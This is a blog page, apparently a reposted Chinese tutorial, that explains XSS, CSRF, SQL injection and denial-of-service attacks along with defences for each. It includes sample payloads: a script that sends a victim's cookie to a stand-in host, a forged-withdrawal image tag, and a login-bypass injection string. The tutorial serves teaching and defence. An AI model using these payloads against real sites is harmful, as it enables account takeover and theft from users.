@@ -1,0 +1,692 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+    
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="攻击技术, 大数据 实时计算 机器学习">
+    <meta name="description" content="攻击技术
+一、跨站脚本攻击
+二、跨站请求伪造
+三、SQL 注入攻击
+四、拒绝服务攻击
+参考资料
+
+一、跨站脚本攻击概念跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTM">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>攻击技术 | ForwardXu</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+</head>
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">ForwardXu</span>
+                    </a>
+                </div>
+                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>主页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ForwardXu</div>
+        <div class="logo-desc">
+            
+            当你的才华还撑不起你的野心时，你就应该静下心来学习。
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                主页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link"><a href="https://github.com/XuQianJin-Stars" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="232619158@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 232619158" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+
+<a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+    <i class="fa fa-rss"></i>
+</a>
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        攻击技术
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            
+            <div class="article-tag">
+                
+                <a href="/tags/攻击技术/" target="_blank">
+                    <span class="chip bg-color">攻击技术</span>
+                </a>
+                
+            </div>
+            
+            <div class="post-info">
+                
+                <span class="post-cate">
+                    <i class="fa fa-bookmark fa-fw icon-category"></i>
+                    
+                    <a href="/categories/系统设计/" class="post-category" target="_blank">
+                        系统设计
+                    </a>
+                    
+                </span>
+                
+
+                <span class="post-date">
+                    <i class="fa fa-clock-o fa-fw"></i>2018-12-24
+                </span>
+            </div>
+        </div>
+        <hr>
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="攻击技术"><a href="#攻击技术" class="headerlink" title="攻击技术"></a>攻击技术</h2><ul>
+<li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E4%B8%80%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">一、跨站脚本攻击</a></li>
+<li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E4%BA%8C%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">二、跨站请求伪造</a></li>
+<li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E4%B8%89sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">三、SQL 注入攻击</a></li>
+<li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E5%9B%9B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">四、拒绝服务攻击</a></li>
+<li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li>
+</ul>
+<h1 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
+<pre><code>&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;
+</code></pre><p>之后该内容可能会被渲染成以下形式：</p>
+<pre><code>&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;
+</code></pre><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
+<li>窃取用户的 Cookie</li>
+<li>伪造虚假的输入表单骗取个人信息</li>
+<li>显示伪造的文章或者图片</li>
+</ul>
+<h2 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-设置-Cookie-为-HttpOnly"><a href="#1-设置-Cookie-为-HttpOnly" class="headerlink" title="1. 设置 Cookie 为 HttpOnly"></a>1. 设置 Cookie 为 HttpOnly</h3><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p>
+<h3 id="2-过滤特殊字符"><a href="#2-过滤特殊字符" class="headerlink" title="2. 过滤特殊字符"></a>2. 过滤特殊字符</h3><p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
+<p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
+<p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
+<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
+<pre><code>&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;
+
+&lt;p&gt;123&lt;/p&gt;
+
+&lt;form&gt;
+  &lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&gt;
+&lt;/form&gt;
+
+&lt;pre&gt;hello&lt;/pre&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+alert(/xss/);
+&lt;/script&gt;
+&lt;h1&gt;XSS Demo&lt;/h1&gt;
+
+&lt;p&gt;123&lt;/p&gt;
+
+&amp;lt;form&amp;gt;
+  &amp;lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&amp;gt;
+&amp;lt;/form&amp;gt;
+
+&lt;pre&gt;hello&lt;/pre&gt;
+
+&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
+alert(/xss/);
+&amp;lt;/script&amp;gt;
+</code></pre><blockquote>
+<p><a href="http://jsxss.com/zh/try.html" target="_blank" rel="noopener">XSS 过滤在线测试</a></p>
+</blockquote>
+<h1 id="二、跨站请求伪造"><a href="#二、跨站请求伪造" class="headerlink" title="二、跨站请求伪造"></a>二、跨站请求伪造</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
+<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
+<h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
+<pre><code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。
+</code></pre><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
+<pre><code>&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。
+</code></pre><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p>
+<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
+<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+<h2 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h3><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p>
+<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
+<h3 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h3><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
+<h3 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h3><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
+<h1 id="三、SQL-注入攻击"><a href="#三、SQL-注入攻击" class="headerlink" title="三、SQL 注入攻击"></a>三、SQL 注入攻击</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
+<h2 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如一个网站登录验证的 SQL 查询代码为：</p>
+<pre><code>strSQL = &quot;SELECT * FROM users WHERE (name = &#39;&quot; + userName + &quot;&#39;) and (pw = &#39;&quot;+ passWord +&quot;&#39;);&quot;
+</code></pre><p>如果填入以下内容：</p>
+<pre><code>userName = &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;;
+passWord = &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;;
+</code></pre><p>那么 SQL 查询字符串为：</p>
+<pre><code>strSQL = &quot;SELECT * FROM users WHERE (name = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;);&quot;
+</code></pre><p>此时无需验证通过就能执行以下查询：</p>
+<pre><code>strSQL = &quot;SELECT * FROM users;&quot;
+</code></pre><h2 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h3><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
+<pre><code>PreparedStatement stmt = connection.prepareStatement(&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;);
+stmt.setString(1, userid);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();
+</code></pre><h3 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h3><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
+<h1 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
+<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">维基百科：跨站脚本</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：SQL 注入攻击</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">维基百科：跨站点请求伪造</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：拒绝服务攻击</a></li>
+</ul>
+<p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md</a></p>
+
+            </div>
+            <hr>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">转载请注明: </span>
+                    <a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io" class="b-link-green">ForwardXu</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2018/12/24/xi-tong-she-ji/gong-ji-ji-zhu/" class="b-link-green">攻击技术</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">上一篇</div>
+            <div class="card">
+                <a href="/2018/12/24/xi-tong-she-ji/huan-cun/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="缓存">
+                        
+                        <span class="card-title">缓存</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">缓存
+一、缓存特征
+二、LRU
+三、缓存位置
+四、CDN
+五、缓存问题
+六、数据分布
+七、一致性哈希
+参考资料
+
+一、缓存特征命中率当某个请求能够通过访问缓存而得到响应时，称为缓存命中。
+缓存命中率越高，缓存的利用率也就越高。
+最大空间缓存</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-24
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/系统设计/" class="post-category" target="_blank">
+                                    系统设计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/缓存/" target="_blank">
+                        <span class="chip bg-color">缓存</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">下一篇</div>
+            <div class="card">
+                <a href="/2018/12/24/suan-fa/fan-zhuan-dan-lian-biao/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="反转单链表">
+                        
+                        <span class="card-title">反转单链表</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">反转单链表问题
+这个题目说的是，给你一个单链表，你需要反转它，然后返回。
+比如说给你的单链表是：
+
+1 -> 2 -> 3 -> 4 -> 5 -> null
+
+你要返回的反转后的链表是：
+
+5 -> 4 -> 3 -> 2 -> 1 -></div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/algorithm/" class="post-category" target="_blank">
+                                    algorithm
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/algorithm/" target="_blank">
+                        <span class="chip bg-color">algorithm</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a>搭建.
+        </div>
+        <div class="col s12 m4 l4 social-link"><a href="https://github.com/XuQianJin-Stars" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="232619158@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 232619158" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+
+<a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+    <i class="fa fa-rss"></i>
+</a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title">搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input" autofocus>
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+</body>
+</html>
